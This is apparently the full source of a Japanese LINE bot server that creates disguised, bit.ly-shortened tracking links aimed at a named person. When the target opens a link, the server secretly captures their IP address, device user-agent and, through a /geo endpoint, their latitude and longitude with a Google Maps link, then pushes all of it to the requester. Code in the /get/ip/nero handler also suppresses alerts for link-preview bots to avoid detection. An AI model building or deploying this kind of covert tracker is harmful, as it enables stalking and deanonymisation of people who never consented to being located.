const https = require("https");
const qs = require("querystring");
const request = require("request");
const cors = require("cors");
const express = require("express");
const port = process.env.PORT || 3000;
const TOKEN = process.env.LINE_TOKEN;
const bitly_token = process.env.BITLY_TOKEN;
let lock = false, random = 400, original = '', geolocation = '', nom = '', id = '';

const app = express();

app
  .use(cors())
  .use(express.urlencoded({
    extended: true
  }))
  .use(express.json())
  .post("/webhook", (req, res) => {
    res.send("HTTP POST request sent to the webhook URL!");
    const replyToken = req.body.events[0].replyToken;
    if (req.body.events[0].message.type === 'text') {
      const userId = req.body.events[0].source.userId;
      const ms = req.body.events[0].message.text;
      random = (ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) ? 
      ~~(Math.random() * 899999 + 100000) : 400;
      const text = (ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) ?
      "下記のサイトで特定したい相手の名前と元のURL、認証コードを入力してください\n\nhttps://zackdnerrr-88a45.web.app/?userId=" + userId + "\n\n認証コード: " + random 
      : "URLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください";
      replyMsg(replyToken, text);
    }else if(req.body.events[0].message.type === 'sticker') {
      replyMsg(replyToken, "スタンプに対応しているわけがありません😅\n\nURLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください");
    };
  })
  .post("/pass", (req, res) => {
    (req.body.text === "ぴやっほゃ") ? res.send(JSON.stringify({pass: random})) : res.sendStatus(415);
  })
  .post("/lock", (req, res) => {
    if(req.body.text === "fucker") {
      lock = true;
      res.sendStatus(200);
      setTimeout(() => {
        lock = false;
      }, 1.8e+6);
    };
  })
  .get("/check", (req, res) => {
    res.send(JSON.stringify({boo: lock}));
  })
  .post("/generated", (req, res) => {
    const name = req.body.name, url = req.body.url, userId = req.query.userId || null;
    const geo = req.query.geo; 
    const query = {
      __auth: "2MRLz7x5Hu7HyXPGspUDdjKmdc4bWPweLp7NNhgCC7xDre8j9xZrwyxCpjtprDmjZHipBSBLDmkGkdGAz5KF65PHwRpQks8MACytPMH3AEpH2i49RparuAZpkDtZbpi5iz2XKeEV5wAGCkCjHJPgiHceSA3cx",
      concealment: "tVTjthsH9BaCLwDhWDEuLAZHa6ftDVtTCeiYBKnnNA2CUxxQdy8jEbV3ugZnLyaynJdXmJcAMZN47hapbcfwtcHm4Lrb7mzwQp5X",
      lang: "ja",
      sendStatus: 200,
      rand: "mBNt6SiHKPwdyxDD4BU4uL57Tgm2MGWLSm7gA7xBWYUASugiFfYQCWebUYdkLe9iX2GYnUPwrrJj4JsNhkLRmJEupnwAPfA4KHLZ",
      name: name,
      static_token: "HGbNpaHeGV8yG65zixRKDMcRetyaQM8Z5VbAcVeUMW67p9nzDuJDVBNHEdg9fx788eDTaWzxadksF5UX7yByYRNCrkbX3XR3xdcy",
      original: url,
      frankness: "iTUgrRcUzUHycPhsacaCW6ptbuQa5RLpPSNYtNHXMuehFX5bFCmR3YbrAyK2VQZGwdcBWXY6c24D9jNcyLnXwYVfJszgTFFudJdx",
      id: userId,
      cont:"Fg2NkZsKAZdPA9mHzL3gQnCNKzLWwFfQ2mGDztCJjKMHyjaARNe5FssGJGPfr3QweRV4z9wyxZVCZPpRLAsZpcQVzeGPwJcxirUu",
      geo: geo
    };
    const longUrl = "https://static-void.herokuapp.com/get/ip/nero?" + qs.stringify(query),
    req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
      access_token: bitly_token,
      longUrl: longUrl
    });
    const options = {
      url: req_url,
      method: "GET",
      json: true
    };
    request(options, (err, response, body) => {
      if (err) {console.log(err)};
      const generated = body.data.url || longUrl;
      res.send(JSON.stringify({access_url: generated}));
    });
  })
  .get("/get/ip/nero", (req, res) => {
    nom = req.query.name; id = req.query.id;
    original = req.query.original; geolocation = req.query.geo;
    res.sendFile(__dirname + '/open.html');
    // get ip
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0';
    // push msg
    const isNoPush = !id || !(String(req.headers["accept-language"]).match(/ja/)) || req.headers["user-agent"] === "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1" || req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)';
    if(!isNoPush) {
        pushMsg(id, `${nom}さんがURLにアクセスしました\n\nIPアドレス: ${ip}\n\n使用デバイス:\n${req.headers["user-agent"]}`);
      };
  })
  .get("/auth", (req, res) => {
    const URL = original || "https://zackdnerrr-88a45.web.app";
    res.send(JSON.stringify({url: URL, geo: geolocation, name: nom, id: id}));
  })
  .post("/geo", (req, res) => {
    res.sendStatus(200);
    pushMsg(req.body.id, `${req.body.name}さんの位置情報が取得できました\n\n緯度: ${req.body.lat}\n経度: ${req.body.lng}\n\ngoogleマップで見る\nhttps://www.google.co.jp/maps?q=${req.body.lat},${req.body.lng}&z=18`);
  })
  .listen(port, () => console.log("listening on " + port))
;

function replyMsg(replyToken, text) {
  const dataString = JSON.stringify({
    replyToken: replyToken,
    messages: [{"type": "text", "text": text}]
  });
  const webhookOptions = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/reply",
    "method": "POST",
    "headers": {
      "Content-Type": "application/json",
      "Authorization": "Bearer " + TOKEN
    },
    "body": dataString
  };
  const request = https.request(webhookOptions, (res) => {
      res.on("data", (d) => {
        process.stdout.write(d);
      })
    })
  request.on("error", (err) => {
    console.error(err);
  })
  request.write(dataString);
  request.end();
};

function pushMsg(id, text) {
  const body = JSON.stringify({
    to: id,
    messages: [
      {"type": "text", "text": text}
    ]
  });
  const options = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/push",
    method: "POST",
    headers: {
      "Content-Type": "application/json; charset=UTF-8",
      "Authorization": "Bearer " + TOKEN
    },
    body: body
  };
  const request = https.request(options, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });
  request.on("error", (err) => {
    console.error(err);
  });
  request.write(body);
  request.end();
};
